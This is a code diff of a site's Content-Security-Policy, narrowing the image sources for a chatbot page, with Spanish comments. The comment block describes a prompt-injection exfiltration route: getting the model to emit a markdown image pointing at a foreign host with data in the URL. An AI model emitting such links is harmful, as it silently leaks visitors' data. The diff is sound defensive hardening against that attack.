@@ -11,11 +11,20 @@ const securityHeaders = [
       "default-src 'self'",
       "script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://static.cloudflareinsights.com",
       "style-src 'self' 'unsafe-inline'",
-      /* https: abierto solo para imágenes: los bots enseñan producto (autos,
-         menú, catálogo) alojado donde el negocio ya lo tiene publicado, y una
-         lista blanca de hosts se rompería con el siguiente tenant. Una imagen
-         no ejecuta nada; script-src y connect-src siguen cerrados. */
-      "img-src 'self' data: blob: https:",
+      /*
+       * Hosts de imagen, uno por uno — NO `https:` abierto.
+       *
+       * Los bots enseñan producto (autos, menú, catálogo) alojado donde el
+       * negocio ya lo publicó, así que hace falta abrir algo. Pero abrir todo
+       * https convierte la burbuja de chat en un canal de salida: basta con que
+       * alguien logre que el modelo escriba ![](https://ajeno/x?d=<lo que sea>)
+       * para que el navegador del visitante lo pida solo, con lo que llevara la
+       * URL. El visitante no ve nada y sus datos ya salieron.
+       *
+       * Un tenant con imágenes en otro host se agrega aquí, a mano y a
+       * propósito. Es el costo correcto.
+       */
+      "img-src 'self' data: blob: https://http2.mlstatic.com https://db-abi-prod.piratapunk.com",
       "font-src 'self'",
       "connect-src 'self' https://cloudflareinsights.com",
       "frame-src https://challenges.cloudflare.com",
